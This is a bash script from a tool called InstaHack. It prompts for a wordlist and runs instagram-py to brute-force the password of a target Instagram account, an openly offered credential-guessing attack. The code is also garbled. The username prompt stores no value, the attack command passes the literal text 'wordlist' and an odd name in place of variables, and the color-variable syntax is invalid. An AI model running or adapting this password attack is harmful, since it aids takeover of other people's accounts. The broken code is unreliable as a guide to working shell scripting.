#!/bin/bash
# manual.sh - InstaHack
#
# The shell / bash script that gives the user the option for manual selection of the wordlist file for the instagram password attack.
#
# Author : SSLRI (https://github.com/sslri/)
# Created on : June 28, 2020
#
#
# Changes made in the last modification :
# 1. Adding commented docs and more comments to the script's code in order to make it more clean and easily readable to the programmers and other hackers.
# 2. Removing some errors and also adding more proper output and specially the colored output system.
# 3. Also, we removed the dependency of the 'lolcat' package in this script file too.
#

# Defining the ANSII color codes variables for colored output
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
BLUE="\033[94m"
RED_REV="\033[07;91m"
DEFCOL="\033"

# The main script starts here

# Displaying the banner of the tool on the console screen
clear
echo -e "${"\033[93m"}
 ____  _  _  ___  ____   __    _   _    __    ___  _  _ 
}
(_  _)( \( )/ __)(_  _) /__\  ( )_( )  /__\  / __)( )/ )
 _)(_  )  ( \__ \  )(  /(__)\  ) _ (  /(__)\( (__  )  ( 
(____)(_)\_)(___/ (__)(__)(__)(_) (_)(__)(__)\___)(_)\_)
              
              ${"\033[00m"}[${"\033[91m"}#${"\033[00m"}] ${"\033[94m"}Manual Password Attack ${"\033[00m"}[${"\033[91m"}#${"\033[00m"}]"
echo -e "\n                \e[101m\e[1;77m  >>  Script By SSLRI << \e[0m\n"
echo -e "\n       \e[100m\e[1;77m >>  instagram : \e[1;96m sslri \e[100m\e[1;77m << \e[0m\n"

# Asking the user to enter the username and password for the target instagram user
read -p "[Folami_collection]" 
read -p "[wordlist] " wordlist
echo -e ""

# Checking wheter the user specified wordlist file exists or not, and then we continue the process
if [[ -f $wordlist ]]; then
	# If the wordlist file specified by the user exists, then we continue the process

	instagram-py -- Folami_collection --password-list wordlist
else
	# If the wordlist file specified by the user does not exists, then we display the error message on the console screen

	echo -e "\n${"\033[07;91m"[ Error : The specified wordlist file '{wordlist}' does not exists ]${"\033[00m"}"
	exit 1
fi

# Finally after all the tasks are executed, we again launch the instahack.sh file (the main script file of the tool)
cd $HOME/instahack
bash instahack.sh
